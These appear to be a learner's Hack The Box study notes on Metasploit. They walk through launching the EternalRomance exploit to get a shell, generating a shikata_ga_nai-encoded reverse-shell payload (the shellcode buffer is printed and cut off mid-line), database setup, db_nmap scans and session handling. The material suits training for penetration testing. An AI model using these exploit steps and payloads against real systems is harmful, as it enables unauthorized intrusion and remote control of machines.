Using `msfconsole -q`
* search EternalRomance
* use 0 (For the auxiliary)
* use 9 (For exploit)
* show options
* set R and LHOST with correct IPs
* Run
* shell (This will pop a shell from the meterpreter)

# Using Encoders
```shell-session
Lazarus2858@htb[/htb]$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai

[*] x86/shikata_ga_nai succeeded with size 1636 (iteration=1)

my $buf = 
"\xbe\x7b\xe6\xcd\x7c\xd9\xf6\xd9\x74\x24\xf4\x58\x2b\xc9" .
"\x66\xb9\x92\x01\x31\x70\x17\x83\xc0\x04\x03\x70\x13\xe2" .
"\x8e\xc9\xe7\x76\x50\x3c\xd8\xf1\xf9\x2e\x7c\x91\x8e\xdd" .
"\x53\x1e\x18\x47\xc0\x8c\x87\xf5\x7d\x3b\x52\x88\x0e\xa6" .
"\xc3\x18\x92\x58\xdb\xcd\x74\xaa\x2a\x3a\x55\xae\x35\x36" .
"\xf0\x5d\xcf\x96\xd0\x81\xa7\xa2\x50\xb2\x0d\x64\xb6\x45" .
"\x06\x0d\xe6\xc4\x8d\x85\x97\x65\x3d\x0a\x37\xe3\xc9\xfc" .
"\xa4\x9c\x5c\x0b\x0b\x49\xbe\x5d\x0e\xdf\xfc\x2e\xc3\x9a" .
"\x3d\xd7\x82\x48\x4e\x72\x69\xb1\xfc\x34\x3e\xe2\xa8\xf9" .
"\xf1\x36\x67\x2c\xc2\x18\xb7\x1e\x13\x49\x97\x12\x03\xde" .
"\x85\xfe\x9e\xd4\x1d\xcb\xd4\x38\x7d\x39\x35\x6b\x5d\x6f" .
"\x50\x1d\xf8\xfd\xe9\x84\x41\x6d\x60\x29\x20\x12\x08\xe7" .
"\xcf\xa0\x82\x6e\x6a\x3a\x5e\x44\x58\x9c\xf2\xc3\xd6\xb9" .
```

# Databases
Postgresql
`sudo service postgresql status or start`
`sudo msfdb init`
`sudo msfdb run`

### Reinitiating the database
```shell-session
Lazarus2858@htb[/htb]$ msfdb reinit
Lazarus2858@htb[/htb]$ cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
Lazarus2858@htb[/htb]$ sudo service postgresql restart
Lazarus2858@htb[/htb]$ msfconsole -q
```

`help database`
`workspace -a target_1
`workspace target_1`
`workspace`

### Scanning
`db_nmap -sV -sS 10.10.10.8`
Other options such as services and host can give you more information and even creds


### Sessions 
Now when I was able to access an account, you can go back to the metepreter shell and type background. go to a different exploit and name it set session 2 
Using the first session you can get all the info and us the exploit
![[Pasted image 20260223192730.png]]
